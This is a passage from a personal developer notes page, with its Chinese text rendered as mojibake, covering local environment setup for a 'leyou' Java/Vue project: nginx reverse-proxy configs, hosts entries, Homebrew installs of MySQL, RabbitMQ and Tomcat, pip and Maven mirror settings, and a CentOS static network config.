<h2 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">brew install nginx</span><br><span class="line">brew services start nginx <span class="comment">#å¯åŠ¨nginx</span></span><br><span class="line">brew services stop nginx </span><br><span class="line">brew services restart nginx</span><br><span class="line">brew <span class="built_in">ls</span> nginx</span><br><span class="line"><span class="built_in">cd</span> /usr/local/etc/nginx/servers</span><br><span class="line">vi leyou.conf</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  api.leyou.com;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">                proxy_pass   http://ly-gateway:10010;</span><br><span class="line">                proxy_connect_timeout 600;</span><br><span class="line">                proxy_read_timeout 5000;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  manage.leyou.com;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">                proxy_pass   http://manage.leyou.com:9001;</span><br><span class="line">                proxy_connect_timeout 600;</span><br><span class="line">                proxy_read_timeout 5000;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  registry.leyou.com;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">                proxy_pass   http://ly-registry:10086;</span><br><span class="line">                proxy_connect_timeout 600;</span><br><span class="line">                proxy_read_timeout 5000;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">        listen   80;</span><br><span class="line">        server_name  www.leyou.com;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">        root  /Users/huangmingwang/leyou-portal;</span><br><span class="line">        &#125;</span><br><span class="line">        location /item &#123;</span><br><span class="line">                <span class="comment"># æºå¸¦hostsåœ°å€ï¼Œé¿å…å› ä»£ç†å¯¼è‡´hostä¸¢å¤±</span></span><br><span class="line">                proxy_set_header Host       <span class="variable">$host</span>;</span><br><span class="line">            proxy_pass   http://ly-linux;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="å®‰è£…rabbitmq"><a href="#å®‰è£…rabbitmq" class="headerlink" title="å®‰è£…rabbitmq"></a>å®‰è£…rabbitmq</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">brew install rabbitmq</span><br><span class="line"></span><br><span class="line">rabbitmq-server # å‰å°è¿è¡Œ</span><br><span class="line"></span><br><span class="line">brew services start rabbitmq # åå°è¿è¡Œ</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="å®‰è£…switchhosts"><a href="#å®‰è£…switchhosts" class="headerlink" title="å®‰è£…switchhosts"></a>å®‰è£…switchhosts</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">##</span><br><span class="line"># Host Database</span><br><span class="line">#</span><br><span class="line"># localhost is used to configure the loopback interface</span><br><span class="line"># when the system is booting. Do not change this entry.</span><br><span class="line">##</span><br><span class="line">127.0.0.1 localhost</span><br><span class="line">127.0.0.1 ly-gateway</span><br><span class="line">127.0.0.1 ly-registry</span><br><span class="line">192.168.58.80 ly-mysql</span><br><span class="line">192.168.58.80 ly-redis</span><br><span class="line">192.168.58.80 ly-mq</span><br><span class="line">192.168.58.80 ly-es</span><br><span class="line">192.168.58.80 ly-canal</span><br><span class="line">192.168.58.80 ly-linux</span><br><span class="line">192.168.58.80 ly-mongo</span><br><span class="line">127.0.0.1 api.leyou.com</span><br><span class="line">127.0.0.1 manage.leyou.com</span><br><span class="line">127.0.0.1 www.leyou.com</span><br><span class="line">127.0.0.1 image.leyou.com</span><br><span class="line">127.0.0.1 registry.leyou.com</span><br><span class="line">140.82.112.4 github.com</span><br><span class="line">255.255.255.255 broadcasthost</span><br><span class="line">::1 localhost</span><br><span class="line"># Parallels Desktop</span><br><span class="line"># 127.0.0.1 download.parallels.com</span><br><span class="line"># 127.0.0.1 toolbox.parallels.com</span><br><span class="line"># 127.0.0.1 desktop.parallels.com</span><br><span class="line"># 127.0.0.1 update.parallels.com</span><br><span class="line"># 127.0.0.1 account.parallels.com</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="å®‰è£…mysql"><a href="#å®‰è£…mysql" class="headerlink" title="å®‰è£…mysql"></a>å®‰è£…mysql</h2><p>è‹¥ä¸è€ƒè™‘ç‰ˆæœ¬ç›´æ¥æ‰§è¡Œä»¥ä¸‹å‘½ä»¤</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">è‹¥ä¸è€ƒè™‘ç‰ˆæœ¬ç›´æ¥æ‰§è¡Œä»¥ä¸‹å‘½ä»¤</span></span><br><span class="line">brew install mysql</span><br><span class="line"><span class="meta">#</span><span class="language-bash">è¦é€‰æ‹©ç‰ˆæœ¬åªè¦åŠ ä¸Š@ç‰ˆæœ¬å³å¯</span></span><br><span class="line">brew install mysql@5.7 </span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¯åŠ¨</span></span><br><span class="line">mysql.server start</span><br><span class="line"><span class="meta">#</span><span class="language-bash">å…³é—­</span></span><br><span class="line">mysql.server stop</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">ç™»å½•mysql,é»˜è®¤æƒ…å†µä¸‹å…å¯†ç™»å½•</span></span><br><span class="line">mysql -u root</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">ä¿®æ”¹å¯†ç  8.0</span></span><br><span class="line">alter user &#x27;root&#x27;@&#x27;localhost&#x27; identified with &#x27;asdfghjkl&#x27; by &#x27;root&#x27;;</span><br></pre></td></tr></table></figure>

<h2 id="mac-ä¿®æ”¹pipé•œåƒä¸ºå›½å†…é•œåƒ"><a href="#mac-ä¿®æ”¹pipé•œåƒä¸ºå›½å†…é•œåƒ" class="headerlink" title="mac ä¿®æ”¹pipé•œåƒä¸ºå›½å†…é•œåƒ"></a>mac ä¿®æ”¹pipé•œåƒä¸ºå›½å†…é•œåƒ</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">å¦‚æœæ²¡æœ‰åˆ™åˆ›å»º</span></span><br><span class="line">cd ~/.pip/</span><br><span class="line">vim pip.conf</span><br><span class="line"></span><br><span class="line">[global]</span><br><span class="line">index-url = [http://mirrors.aliyun.com/pypi/simple/](https://link.jianshu.com/?t=http://mirrors.aliyun.com/pypi/simple/)</span><br><span class="line">[install]</span><br><span class="line">trusted-host=mirrors.aliyun.com</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">æˆ–è€…</span></span><br><span class="line">[global]</span><br><span class="line">index-url = [https://pypi.tuna.tsinghua.edu.cn/simple](https://link.jianshu.com/?t=https://pypi.tuna.tsinghua.edu.cn/simple)</span><br><span class="line">[install]</span><br><span class="line">trusted-host=pypi.tuna.tsinghua.edu.cn</span><br></pre></td></tr></table></figure>

<h2 id="Parallels-Desktopå…±äº«ç½‘ç»œhost-onlyæ¡¥æ¥ç½‘ç»œ"><a href="#Parallels-Desktopå…±äº«ç½‘ç»œhost-onlyæ¡¥æ¥ç½‘ç»œ" class="headerlink" title="Parallels Desktopå…±äº«ç½‘ç»œhost-onlyæ¡¥æ¥ç½‘ç»œ"></a>Parallels Desktopå…±äº«ç½‘ç»œhost-onlyæ¡¥æ¥ç½‘ç»œ</h2><h3 id="å…±äº«ç½‘ç»œ"><a href="#å…±äº«ç½‘ç»œ" class="headerlink" title="å…±äº«ç½‘ç»œ"></a>å…±äº«ç½‘ç»œ</h3><p>10.211.55.1 - 10.211.55.254 </p>
<p>è™šæ‹Ÿæœºä¹‹é—´å¯ä»¥pingé€šï¼Œä¸»æœºä¸è™šæ‹Ÿæœºä¹‹é—´ä¹Ÿèƒ½pingé€šï¼Œä¸»æœºèƒ½ä¸Šå¤–ç½‘ï¼Œåˆ™è™šæ‹Ÿæœºèƒ½ä¸Šç½‘ã€‚</p>
<p>å½“ä¸»æœºå…³é—­ç½‘ç»œæ—¶ï¼Œä¸»æœºä¸èƒ½è¿æ¥è™šæ‹Ÿæœºï¼Œè™šæ‹Ÿæœºä¹‹é—´èƒ½é€šä¿¡ã€‚</p>
<p>ä½†æ˜¯ä¸ä¸»æœºåœ¨åŒä¸€åŒºåŸŸå†…å…¶å®ƒä¸»æœºè®¿é—®ä¸äº†è™šæ‹Ÿæœºã€‚</p>
<h3 id="host-only"><a href="#host-only" class="headerlink" title="host-only"></a>host-only</h3><p>10.37.129.1-10.37.129.254</p>
<p>è™šæ‹Ÿæœºç›´æ¥èƒ½pingé€šï¼Œä½†æ˜¯è™šæ‹Ÿæœºpingä¸åŒä¸»æœºï¼Œä¸»æœºèƒ½pingé€šè™šæ‹Ÿæœºï¼Œè™šæ‹Ÿæœºä¸èƒ½ä¸Šç½‘ã€‚</p>
<h3 id="æ¡¥æ¥ç½‘ç»œ"><a href="#æ¡¥æ¥ç½‘ç»œ" class="headerlink" title="æ¡¥æ¥ç½‘ç»œ"></a>æ¡¥æ¥ç½‘ç»œ</h3><p>è™šæ‹Ÿæœºå’Œä¸»æœºåœ¨åŒä¸€ç½‘æ®µï¼Œç›¸å½“äºæ˜¯ä¸€å°ä¸ä¸»æœºå¤„äºåŒä¸€å±€åŸŸç½‘å†…çš„ç‹¬ç«‹ä¸»æœºã€‚</p>
<p>å½“ä¸»æœºå…³é—­ç½‘ç»œæ—¶ï¼Œä¸»æœºè¿æ¥ä¸ä¸Šè™šæ‹Ÿæœºï¼Œè™šæ‹Ÿæœºä¹‹é—´ä¹Ÿä¸èƒ½é€šä¿¡ã€‚</p>
<h2 id="ideaé…ç½®aliyuné•œåƒ"><a href="#ideaé…ç½®aliyuné•œåƒ" class="headerlink" title="ideaé…ç½®aliyuné•œåƒ"></a>ideaé…ç½®aliyuné•œåƒ</h2><p>æ²¡æœ‰settings.xmlæ–‡ä»¶å°±åˆ›å»º</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">1 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æœ‰çš„è¯å°†ä¸‹é¢éƒ¨åˆ†æ’å…¥å³å¯</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>alimaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>aliyun maven<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>uk<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>Human Readable Name for this Mirror.<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://uk.maven.org/maven2/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>CN<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>OSChina Central<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.oschina.net/content/groups/public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>nexus<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>internal nexus repository<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- &lt;url&gt;http://192.168.1.100:8081/nexus/content/groups/public/&lt;/url&gt;--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://repo.maven.apache.org/maven2<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="IDEAä¸­è®¾ç½®Run-Dashboard"><a href="#IDEAä¸­è®¾ç½®Run-Dashboard" class="headerlink" title="IDEAä¸­è®¾ç½®Run Dashboard"></a>IDEAä¸­è®¾ç½®Run Dashboard</h2><p>è®¾ç½®æ‰“å¼€Run Dashboard ï¼ˆView-ã€‹Tool Windows-ã€‹Run Dashboardï¼‰</p>
<p>å¦‚æœä¸Šè¿°çš„é€‰é¡¹é‡Œæ²¡æœ‰Run Dashboardï¼Œå¯ä»¥åœ¨å·¥ç¨‹ç›®å½•ä¸‹æ‰¾.ideaæ–‡ä»¶å¤¹ä¸‹çš„workspace.xmlï¼Œåœ¨å…¶ä¸­å¢åŠ å¦‚ä¸‹ç»„ä»¶</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">component</span> <span class="attr">name</span>=<span class="string">&quot;RunDashboard&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">&quot;configurationTypes&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">set</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;SpringBootApplicationConfigurationType&quot;</span> /&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">set</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">&quot;ruleStates&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">RuleState</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ConfigurationTypeDashboardGroupingRule&quot;</span> /&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">RuleState</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">RuleState</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;StatusDashboardGroupingRule&quot;</span> /&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">RuleState</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">component</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="ideaè®¾ç½®"><a href="#ideaè®¾ç½®" class="headerlink" title="ideaè®¾ç½®"></a>ideaè®¾ç½®</h2><ul>
<li><p>alibaba java coding guidelines </p>
</li>
<li><p>è®¾ç½®ä»£ç æ¨¡ç‰ˆ code folding</p>
</li>
<li><p>é…ç½®è‡ªåŠ¨å¯¼åŒ…</p>
</li>
</ul>
<h2 id="å®‰è£…tomcat"><a href="#å®‰è£…tomcat" class="headerlink" title="å®‰è£…tomcat"></a>å®‰è£…tomcat</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">brew install tomcat</span><br><span class="line">brew ls tomcat</span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¯åŠ¨</span></span><br><span class="line">brew services start tomcat</span><br><span class="line"><span class="meta">#</span><span class="language-bash">åœæ­¢</span></span><br><span class="line">brew services stop tomcat</span><br></pre></td></tr></table></figure>

<h2 id="Option"><a href="#Option" class="headerlink" title="Option"></a>Option</h2><h3 id="æµè§ˆå™¨çº§è¡Œä¸º"><a href="#æµè§ˆå™¨çº§è¡Œä¸º" class="headerlink" title="æµè§ˆå™¨çº§è¡Œä¸º"></a>æµè§ˆå™¨çº§è¡Œä¸º</h3><p>è¿™ä¸ªæ¦‚å¿µå¬ç€æœ‰ç‚¹è€³ç”Ÿï¼Œå—¯æ˜¯æˆ‘è‡ªå·±è¿™ä¹ˆè¯´çš„ã€‚ã€‚ã€‚æˆ‘ä»¬å¯ä»¥æŠŠæµè§ˆå™¨è‡ªä¸»å‘èµ·çš„è¡Œä¸ºç§°ä¹‹ä¸º<strong>â€œæµè§ˆå™¨çº§è¡Œä¸ºâ€</strong>ã€‚ä¹‹æ‰€ä»¥è¯´optionsæ˜¯ä¸€ç§æµè§ˆå™¨çº§è¡Œä¸ºï¼Œæ˜¯å› ä¸ºåœ¨<strong>æŸäº›æƒ…å†µ</strong>ä¸‹ï¼Œæ™®é€šçš„getæˆ–è€…postè¯·æ±‚å›é¦–å…ˆè‡ªåŠ¨å‘èµ·ä¸€æ¬¡optionsè¯·æ±‚ï¼Œå½“optionsè¯·æ±‚æˆåŠŸè¿”å›åï¼ŒçœŸæ­£çš„ajaxè¯·æ±‚æ‰ä¼šå†æ¬¡å‘èµ·ã€‚</p>
<p>å†æ¥çœ‹ä¸‹è¿™ä¸ªâ€œæŸäº›æƒ…å†µä¸‹â€éƒ½æ˜¯ä»€ä¹ˆæƒ…å†µï¼Ÿ</p>
<p>1ã€è·¨åŸŸè¯·æ±‚ï¼Œéè·¨åŸŸè¯·æ±‚ä¸ä¼šå‡ºç°optionsè¯·æ±‚<br>2ã€è‡ªå®šä¹‰è¯·æ±‚å¤´<br>3ã€è¯·æ±‚å¤´ä¸­çš„content-typeæ˜¯application&#x2F;x-www-form-urlencodedï¼Œmultipart&#x2F;form-dataï¼Œtext&#x2F;plainä¹‹å¤–çš„æ ¼å¼</p>
<p>å½“æ»¡è¶³æ¡ä»¶12æˆ–è€…13çš„æ—¶å€™ï¼Œç®€å•çš„ajaxè¯·æ±‚å°±ä¼šå‡ºç°optionsè¯·æ±‚ï¼Œæœ‰æ²¡æœ‰æ„Ÿè§‰åˆ°ä¸€ç‚¹åŒæºç­–ç•¥çš„æ„æ€ï¼Œä¸ªäººç†è§£è¿™ä¸ªå°±æ˜¯æµè§ˆå™¨åº•å±‚å¯¹äºåŒæºç­–ç•¥çš„ä¸€ä¸ªå…·ä½“å®ç°ã€‚é¦–å…ˆå¾—åˆ°æœåŠ¡å™¨ç«¯çš„ç¡®è®¤ï¼Œæ‰èƒ½ç»§ç»­ä¸‹ä¸€æ­¥çš„æ“ä½œï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆoptionsè¯·æ±‚ä¹Ÿè¢«å«åšâ€œé¢„æ£€â€è¯·æ±‚çš„åŸå› å§ã€‚</p>
<h3 id="å‡ºç°ä¹‹åæ€ä¹ˆå¤„ç†ï¼ŸæœåŠ¡ç«¯æ€ä¹ˆå“åº”è¿™ä¸ªï¼Ÿ"><a href="#å‡ºç°ä¹‹åæ€ä¹ˆå¤„ç†ï¼ŸæœåŠ¡ç«¯æ€ä¹ˆå“åº”è¿™ä¸ªï¼Ÿ" class="headerlink" title="å‡ºç°ä¹‹åæ€ä¹ˆå¤„ç†ï¼ŸæœåŠ¡ç«¯æ€ä¹ˆå“åº”è¿™ä¸ªï¼Ÿ"></a>å‡ºç°ä¹‹åæ€ä¹ˆå¤„ç†ï¼ŸæœåŠ¡ç«¯æ€ä¹ˆå“åº”è¿™ä¸ªï¼Ÿ</h3><p>è¿™ä¸ªåŸºæœ¬æ€è·¯å°±æ˜¯serverç«¯åœ¨æ¥æ”¶åˆ°è¯·æ±‚çš„æ—¶å€™ï¼Œå…ˆå»åˆ¤æ–­ä¸‹æ˜¯ä¸æ˜¯optionsè¯·æ±‚ï¼Œåˆ¤æ–­ä¸‹æ¥æºï¼Œæ²¡é—®é¢˜çš„æ—¶å€™è¿”å›ä¸ª200ä¹‹ç±»çš„æˆåŠŸå°±å¯ä»¥äº†ã€‚ä¸è¿‡ç”±äºæ²¡åšä¸ªå…·ä½“çš„demoä¹‹ç±»çš„ï¼Œè¿™ä¸ªå°±ä¸ç»†è¯´äº†ã€‚</p>
<h2 id="å®‰è£…python3"><a href="#å®‰è£…python3" class="headerlink" title="å®‰è£…python3"></a>å®‰è£…python3</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">Homebrew ä¼šä¸ºæ‚¨å®‰è£… pip3 ã€‚</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">pip3 æ˜¯Homebrewç‰ˆPython 3çš„ pip çš„åˆ«åã€‚</span></span><br><span class="line">brew install python</span><br><span class="line"><span class="meta">#</span><span class="language-bash">å°†æ‰“å¼€é€šè¿‡HomeBrewå®‰è£…çš„Pythonè§£é‡Šå™¨ã€‚</span></span><br><span class="line">python</span><br><span class="line"><span class="meta">#</span><span class="language-bash">å°†ä¼šæ‰“å¼€ä½¿ç”¨Homebrewå®‰è£…çš„Python 2è§£é‡Šå™¨ï¼ˆå¦‚æœæœ‰ï¼‰ã€‚</span></span><br><span class="line">python2</span><br><span class="line"><span class="meta">#</span><span class="language-bash">å°†ä¼šæ‰“å¼€ä½¿ç”¨Homebrewå®‰è£…çš„Python 3è§£é‡Šå™¨ï¼ˆå¦‚æœæœ‰ï¼‰ã€‚</span></span><br><span class="line">python3</span><br></pre></td></tr></table></figure>

<h3 id="brew-install-æ— æ³•ä»ghcr-io-x2F-v2-x2F-homebrew-x2F-coreä¸‹è½½å®‰è£…ï¼Œæ€ä¹ˆè§£å†³ï¼Ÿ"><a href="#brew-install-æ— æ³•ä»ghcr-io-x2F-v2-x2F-homebrew-x2F-coreä¸‹è½½å®‰è£…ï¼Œæ€ä¹ˆè§£å†³ï¼Ÿ" class="headerlink" title="brew install æ— æ³•ä»ghcr.io&#x2F;v2&#x2F;homebrew&#x2F;coreä¸‹è½½å®‰è£…ï¼Œæ€ä¹ˆè§£å†³ï¼Ÿ"></a>brew install æ— æ³•ä»ghcr.io&#x2F;v2&#x2F;homebrew&#x2F;coreä¸‹è½½å®‰è£…ï¼Œæ€ä¹ˆè§£å†³ï¼Ÿ</h3><p>åŸå› æ˜¯<code>Homebrew</code>çš„<code>bottles</code>æ–‡ä»¶è¿ç§»åˆ°äº†<code>GitHub Packages</code>ï¼Œé•œåƒåœ°å€éœ€è¦è°ƒæ•´ã€‚</p>
<p>åŒæ—¶ä¹Ÿéœ€è¦æ›´æ–°<code>Homebrew</code>åˆ°æœ€æ–°ç‰ˆã€‚ </p>
<p>è®¾ç½®é•œåƒæºä¸ºä¸­ç§‘å¤§å³å¯</p>
<h2 id="æ­å»ºæœºå™¨å­¦ä¹ ç¯å¢ƒ"><a href="#æ­å»ºæœºå™¨å­¦ä¹ ç¯å¢ƒ" class="headerlink" title="æ­å»ºæœºå™¨å­¦ä¹ ç¯å¢ƒ"></a>æ­å»ºæœºå™¨å­¦ä¹ ç¯å¢ƒ</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip3 install virtualenv virtualenvwrapper</span><br><span class="line">pip3 install numpy</span><br><span class="line">pip3 install pandas</span><br><span class="line">pip3 install tables</span><br><span class="line">pip3 install matplotlib</span><br><span class="line">pip3 install --user jupyter</span><br><span class="line">python3 -m IPython notebook</span><br></pre></td></tr></table></figure>



<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="å®‰è£…jdk8-3"><a href="#å®‰è£…jdk8-3" class="headerlink" title="å®‰è£…jdk8"></a>å®‰è£…jdk8</h2><p>ç›´æ¥å®‰è£…</p>
<h2 id="é…ç½®hosts-switchhost"><a href="#é…ç½®hosts-switchhost" class="headerlink" title="é…ç½®hosts(switchhost)"></a>é…ç½®hosts(switchhost)</h2><p>æŠŠhostsçš„åªè¯»é€‰é¡¹å»æ‰,ç„¶ååœ¨å®‰å…¨ä¸­æ›´æ”¹ç”¨æˆ·æƒé™å³å¯ä½¿ç”¨switchhost</p>
<h2 id="é…ç½®vueç¯å¢ƒ"><a href="#é…ç½®vueç¯å¢ƒ" class="headerlink" title="é…ç½®vueç¯å¢ƒ"></a>é…ç½®vueç¯å¢ƒ</h2><p>åœ¨leyou-manageç›®å½•ä¸‹æ‰“å¼€dos: </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">å®‰è£…node.js</span></span><br><span class="line">https://nodejs.org/en/download/</span><br><span class="line"><span class="meta">#</span><span class="language-bash">å®‰è£…cnpm</span></span><br><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br><span class="line"><span class="meta">#</span><span class="language-bash">å®‰è£…vue-cli</span></span><br><span class="line">cnpm install -g vue-cli</span><br><span class="line">npm install</span><br><span class="line">npm run serve</span><br></pre></td></tr></table></figure>

<p>åœ¨leyou-portalç›®å½•ä¸‹æ‰“å¼€dosï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">æ‰§è¡Œé¡¹ç›®åˆå§‹åŒ–</span></span><br><span class="line">npm init -y</span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ‰§è¡Œvueçš„å®‰è£…</span></span><br><span class="line">npm install vue --save</span><br></pre></td></tr></table></figure>

<h2 id="å®‰è£…centos-hmwç‰ˆæœ¬"><a href="#å®‰è£…centos-hmwç‰ˆæœ¬" class="headerlink" title="å®‰è£…centos-hmwç‰ˆæœ¬"></a>å®‰è£…centos-hmwç‰ˆæœ¬</h2><p>è®¾ç½®æ¡¥æ¥æ¨¡å¼ï¼ˆ192.168.58.154ï¼‰</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">TYPE=Ethernet</span><br><span class="line">PROXY_METHOD=none</span><br><span class="line">BROWSER_ONLY=no</span><br><span class="line">BOOTPROTO=static</span><br><span class="line">DEFROUTE=yes</span><br><span class="line">IPV4_FAILURE_FATAL=no</span><br><span class="line">IPV6INIT=yes</span><br><span class="line">IPV6_AUTOCONF=yes</span><br><span class="line">IPV6_DEFROUTE=yes</span><br><span class="line">IPV6_FAILURE_FATAL=no</span><br><span class="line">IPV6_ADDR_GEN_MODE=stable-privacy</span><br><span class="line">NAME=ens33</span><br><span class="line">UUID=c5a33f9f-d3a8-456a-94b3-8a8218f50497</span><br><span class="line">DEVICE=ens33</span><br><span class="line">ONBOOT=yes</span><br><span class="line">IPADDR=192.168.58.154</span><br><span class="line">PREFIX=24</span><br><span class="line">GATEWAY=192.168.58.1</span><br><span class="line">DNS1=119.29.29.29</span><br></pre></td></tr></table></figure>

<h1 id="windows-ä¿®æ”¹åŸŸå"><a href="#windows-ä¿®æ”¹åŸŸå" class="headerlink" title="windows ä¿®æ”¹åŸŸå"></a>windows ä¿®æ”¹åŸŸå</h1><p>centos-endç‰ˆæœ¬(wl9939.top)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">é‡å¯</span></span><br><span class="line">cd /usr/resty</span><br><span class="line">nginx -p `pwd`/ -c conf/nginx.conf</span><br><span class="line"><span class="meta"># </span><span class="language-bash">å…ˆå¯åŠ¨æ‰èƒ½reload</span></span><br><span class="line">nginx -p `pwd` -c conf/nginx.conf -s reload</span><br><span class="line"><span class="meta">#</span><span class="language-bash">å…¶ä¸­çš„-pä¸»è¦æ˜¯æŒ‡æ˜nginxå¯åŠ¨æ—¶çš„é…ç½®ç›®å½•ï¼›-cä¸º Nginx æŒ‡å®šä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œæ¥ä»£æ›¿ç¼ºçœçš„ã€‚</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"><span class="comment">## seata</span></span></span><br><span class="line">cd seata/conf</span><br><span class="line">vi registry.conf</span><br><span class="line"></span><br><span class="line">registry &#123;</span><br><span 